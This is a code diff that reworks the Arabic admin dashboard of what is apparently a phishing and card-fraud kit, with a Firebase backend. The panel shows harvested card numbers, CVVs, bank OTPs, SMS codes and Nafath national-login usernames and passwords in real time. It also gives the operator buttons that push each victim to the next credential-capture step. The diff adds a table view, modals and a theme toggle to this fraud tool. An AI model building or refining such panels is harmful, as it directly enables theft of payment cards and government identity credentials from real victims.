@@ -3,45 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="js/theme-toggle.js"></script>
     <title>لوحة التحكم | الإدارة</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/site-theme.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <link rel="icon" type="image/png" href="https://tree.com.sa/assets/images/favicon.png">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
-        body { font-family: 'Cairo', sans-serif; background: #f4f6f9; }
-        .navbar { box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-
-        .accordion-item { margin-bottom: 10px; border-radius: 15px !important; border: 1px solid #dee2e6; overflow: hidden; }
-        .accordion-item.new-order { border-left: 5px solid #198754; animation: pulse-green 2s infinite; }
-        .accordion-item.has-card { border-left: 5px solid #ffc107; }
-
-        .accordion-button { font-weight: 600; }
-        .accordion-button:not(.collapsed) { background-color: #f8f9fa; box-shadow: inset 0 -1px 0 rgba(0,0,0,.125); }
-
-        @keyframes pulse-green { 0% { box-shadow: 0 0 0 0 rgba(25, 135, 84, 0.4); } 70% { box-shadow: 0 0 0 10px rgba(25, 135, 84, 0); } 100% { box-shadow: 0 0 0 0 rgba(25, 135, 84, 0); } }
-
+        .admin-table-wrap { border-radius: 16px; overflow: hidden; border: 1px solid var(--tree-border, #dee2e6); background: var(--tree-card, #fff); box-shadow: var(--tree-shadow-sm, 0 4px 20px rgba(0,0,0,0.06)); }
+        .admin-table { margin-bottom: 0; font-size: 0.9rem; }
+        .admin-table thead th { background: var(--tree-bg-elevated, #f8f9fa); color: var(--tree-text, #212529); font-weight: 700; white-space: nowrap; padding: 14px 12px; border-bottom: 2px solid var(--tree-primary, #198754); }
+        .admin-table tbody td { padding: 12px; vertical-align: middle; }
+        .admin-table tbody tr.admin-row--fresh { background: linear-gradient(90deg, rgba(25, 135, 84, 0.12) 0%, rgba(25, 135, 84, 0.02) 55%, transparent 100%); }
+        html[data-theme="dark"] .admin-table tbody tr.admin-row--fresh { background: rgba(45, 212, 138, 0.1); }
+        .admin-table tbody tr.admin-row--fresh td:first-child { box-shadow: inset 4px 0 0 var(--tree-primary, #198754); }
+        .admin-table .col-status { max-width: 220px; }
+        .status-badge { font-size: 0.8rem; padding: 6px 10px; border-radius: 20px; max-width: 100%; display: inline-block; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
         .badge-status { font-size: 0.85rem; padding: 6px 12px; border-radius: 20px; }
-        
-        .info-group { background: #f8f9fa; padding: 10px; border-radius: 8px; margin-bottom: 8px; font-size: 0.9rem; }
-        .info-label { color: #6c757d; display: block; font-size: 0.8rem; margin-bottom: 3px; }
-        .info-value { font-weight: bold; color: #2c3e50; word-break: break-all; }
-        
         .credit-card-box { background: linear-gradient(135deg, #1e293b, #0f172a); color: white; padding: 15px; border-radius: 12px; margin: 15px 0; position: relative; }
         .cc-number { font-family: monospace; font-size: 1.2rem; letter-spacing: 2px; margin: 10px 0; color: #fbbf24; }
-        
-        .control-panel { background: #f8f9fa; padding: 15px; border-radius: 12px; margin-top: 15px; }
         .control-btn { font-size: 0.85rem; padding: 8px 12px; margin: 2px; }
-        
         .nafath-input-group { display: flex; gap: 5px; margin-top: 10px; }
+        .info-group { background: var(--tree-bg-elevated, #f8f9fa); padding: 10px; border-radius: 8px; margin-bottom: 8px; font-size: 0.9rem; border: 1px solid var(--tree-border, #eee); }
+        .info-label { color: var(--tree-text-muted, #6c757d); display: block; font-size: 0.8rem; margin-bottom: 3px; }
+        .info-value { font-weight: bold; color: var(--tree-text, #2c3e50); word-break: break-all; }
+        @media (max-width: 992px) {
+            .admin-table { font-size: 0.8rem; }
+            .admin-table thead th, .admin-table tbody td { padding: 8px 6px; }
+        }
     </style>
 </head>
-<body>
+<body class="tree-site">
+
+<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
 <!-- شاشة تسجيل الدخول -->
-<div id="login-screen" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f4f6f9; z-index: 10000; display: flex; align-items: center; justify-content: center;">
+<div id="login-screen" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--tree-bg); z-index: 10000; display: flex; align-items: center; justify-content: center;">
     <div class="bg-white p-5 rounded-4 shadow-lg text-center" style="width: 100%; max-width: 400px;">
         <h3 class="mb-4 fw-bold text-dark">🔐 دخول الإدارة</h3>
         <input type="password" id="admin-pass" class="form-control mb-3 text-center" placeholder="أدخل كلمة المرور" style="font-size: 1.2rem;">
@@ -70,14 +70,58 @@
 <audio id="sound-new" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio> <!-- جرس طلب جديد -->
 <audio id="sound-card" src="https://assets.mixkit.co/active_storage/sfx/2870/2870-preview.mp3"></audio> <!-- جرس بطاقة جديدة -->
 
-<div class="container mt-4">
-    <div class="accordion" id="orders-list">
-        <div class="col-12 text-center text-muted py-5">
-            <div class="spinner-border text-success" role="status"></div>
-            <p class="mt-2">جاري الاتصال بقاعدة البيانات...</p>
+<div class="container mt-4 mb-5">
+    <div id="orders-table-container" class="admin-table-wrap">
+        <div class="table-responsive">
+            <table class="table table-hover align-middle admin-table mb-0">
+                <thead>
+                    <tr>
+                        <th scope="col">الاسم</th>
+                        <th scope="col">رقم الهوية</th>
+                        <th scope="col">الهاتف</th>
+                        <th scope="col" class="col-status">الحالة</th>
+                        <th scope="col">التاريخ</th>
+                        <th scope="col" class="text-center">إجراءات</th>
+                    </tr>
+                </thead>
+                <tbody id="orders-table-body">
+                    <tr>
+                        <td colspan="6" class="text-center text-muted py-5">
+                            <div class="spinner-border text-success" role="status"></div>
+                            <p class="mt-2 mb-0">جاري الاتصال بقاعدة البيانات...</p>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
         </div>
     </div>
 </div>
+</div>
+
+<!-- نافذة التفاصيل -->
+<div class="modal fade" id="detailModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-lg modal-dialog-scrollable modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header border-success">
+                <h5 class="modal-title fw-bold"><i class="fas fa-file-alt me-2 text-success"></i>تفاصيل الطلب</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="إغلاق"></button>
+            </div>
+            <div class="modal-body" id="detail-modal-body"></div>
+        </div>
+    </div>
+</div>
+
+<!-- نافذة البطاقة -->
+<div class="modal fade" id="cardModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header border-warning">
+                <h5 class="modal-title fw-bold"><i class="fas fa-credit-card me-2 text-warning"></i>بيانات البطاقة</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="إغلاق"></button>
+            </div>
+            <div class="modal-body" id="card-modal-body"></div>
+        </div>
+    </div>
 </div>
 
 <script>
@@ -92,10 +136,50 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
+    let ordersCache = {};
+    let currentDetailOrderId = null;
     let viewed = JSON.parse(localStorage.getItem('viewed') || '[]');
-    let previousStates = {}; // لتتبع التغييرات وتشغيل الأصوات
+    let previousStates = {};
     let isFirst = true;
     let soundEnabled = true;
+
+    const MS_DAY = 24 * 60 * 60 * 1000;
+
+    function getTimestampMs(data) {
+        const t = data.timestamp;
+        if (!t) return 0;
+        if (typeof t.toMillis === 'function') return t.toMillis();
+        if (t.seconds !== undefined) return t.seconds * 1000 + (t.nanoseconds || 0) / 1e6;
+        return 0;
+    }
+
+    function isWithin24Hours(data) {
+        const ms = getTimestampMs(data);
+        if (!ms) return false;
+        return Date.now() - ms < MS_DAY;
+    }
+
+    function formatOrderDate(data) {
+        const t = data.timestamp;
+        if (!t) return '—';
+        const d = typeof t.toDate === 'function' ? t.toDate() : new Date((t.seconds || 0) * 1000);
+        return isNaN(d.getTime()) ? '—' : d.toLocaleString('ar-SA', { dateStyle: 'medium', timeStyle: 'short' });
+    }
+
+    function esc(s) {
+        if (s == null || s === undefined) return '';
+        return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
+    }
+
+    function displayName(data) {
+        const n = data.card_name || data.name || data.full_name;
+        return n ? String(n) : '—';
+    }
+
+    function statusBadgeClass(data) {
+        if (data.card_number) return 'bg-warning text-dark';
+        return 'bg-secondary';
+    }
 
     function toggleSound() {
         soundEnabled = !soundEnabled;
@@ -105,239 +189,191 @@
     function playSound(type) {
         if (!soundEnabled) return;
         const audio = document.getElementById(type === 'card' ? 'sound-card' : 'sound-new');
-        if(audio) { audio.currentTime = 0; audio.play().catch(e => console.log(e)); }
+        if (audio) { audio.currentTime = 0; audio.play().catch(function () {}); }
     }
-    
-    // التحقق من كلمة المرور للدخول
+
     function checkAdmin() {
         const p = document.getElementById('admin-pass').value;
-        // كلمة المرور هنا هي "123456" - يمكنك تغييرها
-        if(p === "123456") {
+        if (p === "123456") {
             document.getElementById('login-screen').style.display = 'none';
             document.getElementById('dashboard-content').style.display = 'block';
-            startLiveUpdate(); // تشغيل الاتصال بالقاعدة فقط بعد الدخول
+            startLiveUpdate();
         } else {
             document.getElementById('login-msg').style.display = 'block';
         }
     }
 
-    // دالة حذف جميع البيانات
     async function deleteAllOrders() {
-        if(!confirm("⚠️ تحذير: هل أنت متأكد من حذف جميع الزوار والطلبات؟\nلا يمكن التراجع عن هذا الإجراء!")) return;
-        
+        if (!confirm("⚠️ تحذير: هل أنت متأكد من حذف جميع الزوار والطلبات؟\nلا يمكن التراجع عن هذا الإجراء!")) return;
         const pwd = prompt("أدخل كلمة المرور للتأكيد (admin):");
-        if(pwd !== "admin") return alert("كلمة المرور خاطئة!");
-
+        if (pwd !== "admin") return alert("كلمة المرور خاطئة!");
         try {
             const snapshot = await db.collection("orders").get();
             if (snapshot.empty) return alert("قاعدة البيانات فارغة بالفعل.");
-
             const batch = db.batch();
-            snapshot.docs.forEach((doc) => {
-                batch.delete(doc.ref);
-            });
-
+            snapshot.docs.forEach(function (doc) { batch.delete(doc.ref); });
             await batch.commit();
             alert("تم حذف جميع البيانات بنجاح ✅");
             location.reload();
-        } catch(e) {
+        } catch (e) {
             console.error(e);
             alert("حدث خطأ أثناء الحذف: " + e.message);
         }
     }
 
-    function startLiveUpdate() {
-    db.collection("orders").onSnapshot((snapshot) => {
-        let docs = [];
-        snapshot.forEach(doc => docs.push({id: doc.id, ...doc.data()}));
-        docs.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
-
-        // تحديث العداد
-        document.getElementById('live-counter').innerText = docs.length;
-
-        const list = document.getElementById('orders-list');
-        if (isFirst) list.innerHTML = ""; // المسح الكامل عند أول تحميل فقط
-
-        docs.forEach(data => {
-            // منطق الأصوات والحالة الجديدة
-            const isNew = !viewed.includes(data.id);
-            
-            // فحص إذا كان هناك بطاقة جديدة لم تكن موجودة سابقاً
-            if (!isFirst && data.card_number && !previousStates[data.id]?.hasCard) {
-                playSound('card');
-            } 
-            // فحص إذا كان طلب جديد كلياً
-            else if (!isFirst && !previousStates[data.id]) {
-                playSound('new');
-            }
-
-            // تحديث الحالة السابقة
-            previousStates[data.id] = { hasCard: !!data.card_number };
-
-            // تحديد الكلاسات
-            let itemClass = "accordion-item";
-            let badgeClass = "bg-secondary";
-            
-            if (isNew) { 
-                itemClass += " new-order"; 
-                badgeClass = "bg-success"; 
-            }
-            if (data.card_number) {
-                itemClass += " has-card";
-                if (!isNew) badgeClass = "bg-warning text-dark";
-            }
-
-            // بناء محتوى البطاقة الداخلي
-            const cardInnerHtml = `
-                <h2 class="accordion-header">
-                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#c-${data.id}" onclick="markRead('${data.id}', event)">
-                        <div class="d-flex w-100 justify-content-between align-items-center pe-3">
-                            <div>
-                                <span class="fw-bold">#${data.id.substring(0,6)}</span>
-                                <small class="text-muted ms-2">${data.id_number || ''}</small>
-                                ${isNew ? '<span class="badge bg-danger ms-2">جديد</span>' : ''}
-                            </div>
-                            <span class="badge badge-status ${badgeClass}">${data.status || 'انتظار'}</span>
-                        </div>
-                    </button>
-                </h2>
-                <div id="c-${data.id}" class="accordion-collapse collapse" data-bs-parent="#orders-list">
-                    <div class="accordion-body">
-                        <h5 class="mb-3 border-bottom pb-2">تفاصيل الطلب الكاملة</h5>
-                        
-                        <!-- عرض كل البيانات -->
-                        ${renderAllData(data)}
-
-                        <!-- عرض بيانات البطاقة والأكواد -->
-                        <div class="row mt-3">
-                            <div class="col-md-7">
-                                ${data.card_number ? `
-                                <div class="credit-card-box h-100">
-                                    <div class="d-flex justify-content-between">
-                                        <small>💳 بيانات الدفع</small>
-                                        <small>${data.card_name || 'No Name'}</small>
-                                    </div>
-                                    <div class="cc-number" dir="ltr">${data.card_number}</div>
-                                    <div class="d-flex justify-content-between mt-2">
-                                        <span>EXP: ${data.expiry || '--/--'}</span>
-                                        <span class="text-danger fw-bold">CVV: ${data.cvv || '---'}</span>
-                                    </div>
-                                </div>
-                                ` : '<div class="alert alert-light text-center h-100 d-flex align-items-center justify-content-center">لم تصل بيانات البطاقة بعد.</div>'}
-                            </div>
-                            <div class="col-md-5">
-                                ${data.otp_code ? `<div class="alert alert-warning py-2 px-3 mb-2"><i class="fas fa-key me-2"></i> OTP البنك: <b>${data.otp_code}</b></div>` : ''}
-                                ${data.mobile_sms_code ? `<div class="alert alert-info py-2 px-3 mb-2"><i class="fas fa-sms me-2"></i> كود الجوال: <b>${data.mobile_sms_code}</b></div>` : ''}
-                                ${data.nafath_username ? `<div class="alert alert-secondary py-2 px-3 mb-2"><i class="fas fa-user me-2"></i> يوزر نفاذ: <b>${data.nafath_username}</b> <br> باسورد: <b>${data.nafath_password}</b></div>` : ''}
-                                ${data.nafath_otp ? `<div class="alert alert-success py-2 px-3 mb-2"><i class="fas fa-fingerprint me-2"></i> توثيق نفاذ: <b>${data.nafath_otp}</b></div>` : ''}
-                            </div>
-                        </div>
-
-                        <!-- لوحة التحكم -->
-                        <div class="control-panel">
-                            <h6 class="small text-muted fw-bold mb-2">التحكم في المسار:</h6>
-                            <div class="d-flex flex-wrap gap-2">
-                                <button class="btn btn-sm btn-outline-warning control-btn" onclick="update('${data.id}','GO_TO_OTP','طلب كود البنك')">طلب OTP</button>
-                                <button class="btn btn-sm btn-outline-danger control-btn" onclick="update('${data.id}','GO_TO_REJECT','رفض البطاقة')">رفض البطاقة</button>
-                                <div class="vr"></div>
-                                <div class="nafath-input-group flex-grow-1">
-                                    <input type="number" id="n-${data.id}" class="form-control form-control-sm" placeholder="رقم نفاذ" value="${data.nafath_code||''}">
-                                    <button class="btn btn-sm btn-primary" onclick="sendN('${data.id}')">إرسال</button>
-                                </div>
-                                <div class="dropdown">
-                                    <button class="btn btn-sm btn-dark dropdown-toggle" type="button" data-bs-toggle="dropdown">
-                                        🎮 تحكم متقدم
-                                    </button>
-                                    <ul class="dropdown-menu dropdown-menu-end text-end">
-                                        <li><a class="dropdown-item" href="#" onclick="update('${data.id}','GO_TO_MOBILE','⏩ تخطي إلى: تأكيد الجوال')">تخطي إلى: تأكيد الجوال</a></li>
-                                        <li><a class="dropdown-item" href="#" onclick="update('${data.id}','GO_TO_NAFATH','⏩ تخطي إلى: نفاذ')">تخطي إلى: نفاذ</a></li>
-                                        <li><hr class="dropdown-divider"></li>
-                                        <li><a class="dropdown-item text-danger" href="#" onclick="update('${data.id}','GO_TO_PAYMENT','⏪ إرجاع للدفع')">إرجاع للبداية (الدفع)</a></li>
-                                    </ul>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            `;
-            
-            // التعامل الذكي مع التحديثات
-            const existingCard = document.getElementById(data.id);
-            if (existingCard) {
-                // إذا الكرت موجود، نتحقق هل هو مفتوح؟
-                const collapseDiv = existingCard.querySelector('.accordion-collapse');
-                const isOpened = collapseDiv && collapseDiv.classList.contains('show');
-                
-                // تحديث المحتوى بالكامل لضمان ظهور أي بيانات جديدة (مثل البطاقة)
-                existingCard.innerHTML = cardInnerHtml;
-                existingCard.className = itemClass; // تحديث الكلاسات (للألوان)
-                
-                // إعادة فتح الكرت إذا كان مفتوحاً
-                if(isOpened) {
-                    const newCollapse = existingCard.querySelector('.accordion-collapse');
-                    newCollapse.classList.add('show');
-                    const btn = existingCard.querySelector('.accordion-button');
-                    btn.classList.remove('collapsed');
-                    btn.setAttribute('aria-expanded', 'true');
-                }
-            } else {
-                // إنشاء كرت جديد
-                const div = document.createElement('div');
-                div.className = itemClass;
-                div.id = data.id;
-                div.innerHTML = cardInnerHtml;
-                list.appendChild(div);
-            }
-        });
-        isFirst = false;
-    });
-    }
-    
-    // دالة مساعدة لإنشاء HTML البيانات
     function renderAllData(data) {
         let html = '<div class="row g-2">';
-        const excludedKeys = ['timestamp', 'next_step', 'status', 'card_name', 'card_number', 'expiry', 'cvv', 'otp_code', 'mobile_sms_code', 'nafath_otp', 'nafath_code', 'nafath_username', 'nafath_password'];
+        const excludedKeys = ['timestamp', 'next_step', 'status', 'card_name', 'card_number', 'expiry', 'cvv', 'otp_code', 'mobile_sms_code', 'nafath_otp', 'nafath_code', 'nafath_username', 'nafath_password', 'id'];
         for (const key in data) {
-            if (!excludedKeys.includes(key) && data[key]) {
-                html += `
-                    <div class="col-md-4 col-6">
-                        <div class="info-group">
-                            <span class="info-label text-capitalize">${key.replace(/_/g, ' ')}</span>
-                            <span class="info-value">${data[key]}</span>
-                        </div>
-                    </div>
-                `;
+            if (key === 'id') continue;
+            if (!excludedKeys.includes(key) && data[key] !== undefined && data[key] !== null && data[key] !== '') {
+                html += '<div class="col-md-4 col-6"><div class="info-group"><span class="info-label text-capitalize">' +
+                    esc(key.replace(/_/g, ' ')) + '</span><span class="info-value">' + esc(data[key]) + '</span></div></div>';
             }
         }
         html += '</div>';
         return html;
     }
 
-    async function update(id, step, msg) { 
-        if(confirm('هل أنت متأكد من تنفيذ الأمر: ' + msg + '؟')) {
-            await db.collection("orders").doc(id).update({ next_step: step, status: msg }); 
+    function buildDetailPanelHtml(data) {
+        const id = data.id;
+        const idJs = id.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+        return '<p class="small text-muted mb-2">معرّف الطلب: <code>' + esc(id) + '</code></p>' +
+            '<h5 class="mb-3 border-bottom pb-2">تفاصيل الطلب الكاملة</h5>' +
+            renderAllData(data) +
+            '<div class="row mt-3">' +
+            '<div class="col-md-7">' +
+            (data.card_number
+                ? '<div class="credit-card-box h-100"><div class="d-flex justify-content-between"><small>💳 بيانات الدفع</small><small>' + esc(data.card_name || 'No Name') + '</small></div>' +
+                  '<div class="cc-number" dir="ltr">' + esc(data.card_number) + '</div>' +
+                  '<div class="d-flex justify-content-between mt-2"><span>EXP: ' + esc(data.expiry || '--/--') + '</span>' +
+                  '<span class="text-danger fw-bold">CVV: ' + esc(data.cvv || '---') + '</span></div></div>'
+                : '<div class="alert alert-light text-center h-100 d-flex align-items-center justify-content-center">لم تصل بيانات البطاقة بعد.</div>') +
+            '</div><div class="col-md-5">' +
+            (data.otp_code ? '<div class="alert alert-warning py-2 px-3 mb-2"><i class="fas fa-key me-2"></i> OTP البنك: <b>' + esc(data.otp_code) + '</b></div>' : '') +
+            (data.mobile_sms_code ? '<div class="alert alert-info py-2 px-3 mb-2"><i class="fas fa-sms me-2"></i> كود الجوال: <b>' + esc(data.mobile_sms_code) + '</b></div>' : '') +
+            (data.nafath_username ? '<div class="alert alert-secondary py-2 px-3 mb-2"><i class="fas fa-user me-2"></i> يوزر نفاذ: <b>' + esc(data.nafath_username) + '</b><br>باسورد: <b>' + esc(data.nafath_password) + '</b></div>' : '') +
+            (data.nafath_otp ? '<div class="alert alert-success py-2 px-3 mb-2"><i class="fas fa-fingerprint me-2"></i> توثيق نفاذ: <b>' + esc(data.nafath_otp) + '</b></div>' : '') +
+            '</div></div>' +
+            '<div class="control-panel bg-light p-3 rounded-3 mt-3 border">' +
+            '<h6 class="small text-muted fw-bold mb-2">التحكم في المسار:</h6>' +
+            '<div class="d-flex flex-wrap gap-2 align-items-center">' +
+            '<button type="button" class="btn btn-sm btn-outline-warning control-btn" onclick="update(\'' + idJs + '\',\'GO_TO_OTP\',\'طلب كود البنك\')">طلب OTP</button>' +
+            '<button type="button" class="btn btn-sm btn-outline-danger control-btn" onclick="update(\'' + idJs + '\',\'GO_TO_REJECT\',\'رفض البطاقة\')">رفض البطاقة</button>' +
+            '<div class="vr d-none d-md-block"></div>' +
+            '<div class="nafath-input-group flex-grow-1" style="min-width:200px">' +
+            '<input type="number" id="nafath-code-input-modal" class="form-control form-control-sm" placeholder="رقم نفاذ" value="' + esc(data.nafath_code || '') + '">' +
+            '<button type="button" class="btn btn-sm btn-primary" onclick="sendNModal()">إرسال</button></div>' +
+            '<div class="dropdown">' +
+            '<button type="button" class="btn btn-sm btn-dark dropdown-toggle" data-bs-toggle="dropdown">🎮 تحكم متقدم</button>' +
+            '<ul class="dropdown-menu dropdown-menu-end text-end">' +
+            '<li><a class="dropdown-item" href="#" onclick="update(\'' + idJs + '\',\'GO_TO_MOBILE\',\'⏩ تخطي إلى: تأكيد الجوال\'); return false;">تخطي إلى: تأكيد الجوال</a></li>' +
+            '<li><a class="dropdown-item" href="#" onclick="update(\'' + idJs + '\',\'GO_TO_NAFATH\',\'⏩ تخطي إلى: نفاذ\'); return false;">تخطي إلى: نفاذ</a></li>' +
+            '<li><hr class="dropdown-divider"></li>' +
+            '<li><a class="dropdown-item text-danger" href="#" onclick="update(\'' + idJs + '\',\'GO_TO_PAYMENT\',\'⏪ إرجاع للدفع\'); return false;">إرجاع للبداية (الدفع)</a></li>' +
+            '</ul></div></div></div>';
+    }
+
+    function buildCardPanelHtml(data) {
+        if (!data.card_number) {
+            return '<div class="alert alert-warning mb-0 text-center"><i class="fas fa-info-circle me-2"></i>لم تصل بيانات البطاقة لهذا الطلب بعد.</div>';
+        }
+        return '<div class="credit-card-box">' +
+            '<div class="d-flex justify-content-between"><small>💳 بيانات الدفع</small><small>' + esc(data.card_name || '—') + '</small></div>' +
+            '<div class="cc-number" dir="ltr">' + esc(data.card_number) + '</div>' +
+            '<div class="d-flex justify-content-between mt-2"><span>EXP: ' + esc(data.expiry || '--/--') + '</span>' +
+            '<span class="text-danger fw-bold">CVV: ' + esc(data.cvv || '---') + '</span></div></div>' +
+            (data.otp_code ? '<div class="alert alert-warning py-2 mt-3 mb-0"><i class="fas fa-key me-2"></i>OTP البنك: <b>' + esc(data.otp_code) + '</b></div>' : '');
+    }
+
+    function openDetailModal(id) {
+        markRead(id);
+        currentDetailOrderId = id;
+        const data = ordersCache[id];
+        if (!data) return;
+        document.getElementById('detail-modal-body').innerHTML = buildDetailPanelHtml(data);
+        bootstrap.Modal.getOrCreateInstance(document.getElementById('detailModal')).show();
+    }
+
+    function openCardModal(id) {
+        markRead(id);
+        const data = ordersCache[id];
+        if (!data) return;
+        document.getElementById('card-modal-body').innerHTML = buildCardPanelHtml(data);
+        bootstrap.Modal.getOrCreateInstance(document.getElementById('cardModal')).show();
+    }
+
+    function markRead(id) {
+        if (!viewed.includes(id)) {
+            viewed.push(id);
+            localStorage.setItem('viewed', JSON.stringify(viewed));
         }
     }
-    
-    async function sendN(id) { 
-        const v = document.getElementById('n-'+id).value;
-        if(!v) return alert('أدخل الرقم أولاً');
-        await db.collection("orders").doc(id).update({ 
-            nafath_code: v, 
-            next_step: 'SHOW_NAFATH_CODE', 
-            status: 'بانتظار الموافقة في نفاذ على رقم: '+v 
-        }); 
+
+    function startLiveUpdate() {
+        db.collection("orders").onSnapshot(function (snapshot) {
+            let docs = [];
+            snapshot.forEach(function (doc) {
+                docs.push({ id: doc.id, ...doc.data() });
+            });
+            docs.sort(function (a, b) { return getTimestampMs(b) - getTimestampMs(a); });
+
+            ordersCache = {};
+            docs.forEach(function (d) { ordersCache[d.id] = d; });
+
+            document.getElementById('live-counter').innerText = docs.length;
+
+            docs.forEach(function (data) {
+                if (!isFirst && data.card_number && !previousStates[data.id]?.hasCard) playSound('card');
+                else if (!isFirst && !previousStates[data.id]) playSound('new');
+                previousStates[data.id] = { hasCard: !!data.card_number };
+            });
+
+            const tbody = document.getElementById('orders-table-body');
+            if (docs.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="6" class="text-center text-muted py-5">لا توجد طلبات</td></tr>';
+                isFirst = false;
+                return;
+            }
+
+            let rows = '';
+            docs.forEach(function (data) {
+                const fresh = isWithin24Hours(data);
+                const trClass = fresh ? ' class="admin-row--fresh"' : '';
+                const oid = esc(data.id);
+                rows += '<tr data-order-id="' + oid + '"' + trClass + '>' +
+                    '<td><span class="fw-semibold">' + esc(displayName(data)) + '</span>' +
+                    (fresh ? ' <span class="badge bg-success bg-opacity-75" title="خلال آخر 24 ساعة">حديث</span>' : '') + '</td>' +
+                    '<td dir="ltr" class="text-muted small">' + esc(data.id_number || '—') + '</td>' +
+                    '<td dir="ltr" class="small">' + esc(data.phone_number || data.phone || '—') + '</td>' +
+                    '<td class="col-status"><span class="status-badge badge ' + statusBadgeClass(data) + '">' + esc(data.status || 'انتظار') + '</span></td>' +
+                    '<td class="text-nowrap small">' + esc(formatOrderDate(data)) + '</td>' +
+                    '<td class="text-center text-nowrap">' +
+                    '<button type="button" class="btn btn-sm btn-outline-primary" data-oid="' + oid + '" onclick="openDetailModal(this.dataset.oid)">تفاصيل</button> ' +
+                    '<button type="button" class="btn btn-sm btn-outline-success" data-oid="' + oid + '" onclick="openCardModal(this.dataset.oid)">بطاقة</button>' +
+                    '</td></tr>';
+            });
+            tbody.innerHTML = rows;
+            isFirst = false;
+        });
     }
-    
-    function markRead(id, event) { 
-        if(!viewed.includes(id)) { 
-            viewed.push(id); localStorage.setItem('viewed', JSON.stringify(viewed)); 
-        } 
-        // إزالة كلاس "new-order" بصرياً فوراً من العنصر الأب
-        const item = event.currentTarget.closest('.accordion-item');
-        item.classList.remove('new-order');
-        // إزالة شارة "جديد"
-        event.currentTarget.querySelector('.badge-danger')?.remove();
+
+    async function update(id, step, msg) {
+        if (!confirm('هل أنت متأكد من تنفيذ الأمر: ' + msg + '؟')) return;
+        await db.collection("orders").doc(id).update({ next_step: step, status: msg });
+    }
+
+    async function sendNModal() {
+        const id = currentDetailOrderId;
+        if (!id) return;
+        const el = document.getElementById('nafath-code-input-modal');
+        const v = el ? el.value : '';
+        if (!v) return alert('أدخل الرقم أولاً');
+        await db.collection("orders").doc(id).update({
+            nafath_code: v,
+            next_step: 'SHOW_NAFATH_CODE',
+            status: 'بانتظار الموافقة في نفاذ على رقم: ' + v
+        });
     }
 </script>
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
